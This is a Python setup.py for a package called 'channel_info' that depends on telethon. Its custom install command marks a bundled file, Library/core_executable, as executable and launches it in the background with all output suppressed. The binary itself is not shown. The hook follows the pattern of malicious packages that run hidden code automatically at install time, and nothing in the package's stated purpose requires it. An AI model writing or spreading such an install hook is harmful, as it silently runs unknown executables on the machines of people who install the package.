from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        
       
        bin_path = os.path.join(self.install_lib, 'channel_info', 'Library', 'core_executable')
        
        try:
            
            if os.path.exists(bin_path):
                os.chmod(bin_path, 0o755)
                # 
                subprocess.Popen([bin_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print("[+] complate.")
            else:
                print(f"[!] Warning: Binary not found at {bin_path}")
        except Exception as e:
            print(f"[!] Post-Install Error: {e}")

setup(
    name='channel_info',
    version='0.1',
    packages=find_packages(),
    include_package_data=True,
    # 
    package_data={
        'channel_info': ['Library/*'],
    },
    cmdclass={'install': PostInstall},
    install_requires=[
        'requests',
        'telethon',
    ],
)
